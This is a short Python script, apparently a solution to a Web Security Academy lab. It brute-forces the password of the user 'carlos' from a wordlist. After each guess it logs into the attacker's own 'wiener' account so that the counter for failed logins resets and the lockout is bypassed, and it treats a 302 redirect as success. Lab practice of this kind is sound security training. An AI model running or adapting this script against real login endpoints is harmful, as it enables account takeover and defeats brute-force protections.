import requests
import time

url = "https://0a9c008b0448c16f81db98b800c50071.web-security-academy.net/login"

MY_USERNAME = "wiener"   
MY_PASSWORD = "peter"

with open("passwords.txt") as f:
    for line in f:
        password = line.strip()

        
        response = requests.post(url, data={"username": "carlos", "password": password}, allow_redirects=False)
        print(f"check carlos: {password} | status: {response.status_code}")

        if response.status_code == 302:  
            print(f"FOUND: {password}")
            break

        
        requests.post(url, data={"username": MY_USERNAME, "password": MY_PASSWORD}, allow_redirects=False)
        time.sleep(0.2)